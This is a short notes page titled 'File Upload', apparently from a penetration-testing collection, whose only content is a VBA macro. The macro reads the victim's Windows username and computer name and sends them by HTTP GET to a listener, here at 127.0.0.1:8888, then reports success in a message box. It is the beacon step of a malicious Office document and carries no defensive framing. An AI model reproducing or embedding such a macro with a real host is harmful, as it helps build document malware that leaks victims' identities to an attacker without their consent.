# File Upload

















<details>

<summary>VBA Script</summary>

```vba
Sub SendHostInfoToServer()
    Dim Username As String
    Dim Hostname As String
    Dim Url As String
    Dim Http As Object

    On Error GoTo ErrorHandler

    Username = Environ("USERNAME")
    Hostname = Environ("COMPUTERNAME")
    Url = "http://127.0.0.1:8888/receive?username=" & Username & "&hostname=" & Hostname

    Set Http = CreateObject("MSXML2.ServerXMLHTTP")
    Http.Open "GET", Url, False
    Http.Send

    MsgBox "Information sent successfully to: " & Url
    Exit Sub

ErrorHandler:
    MsgBox "Error " & Err.Number & ": " & Err.Description, vbCritical, "Macro Error"
End Sub
```

</details>
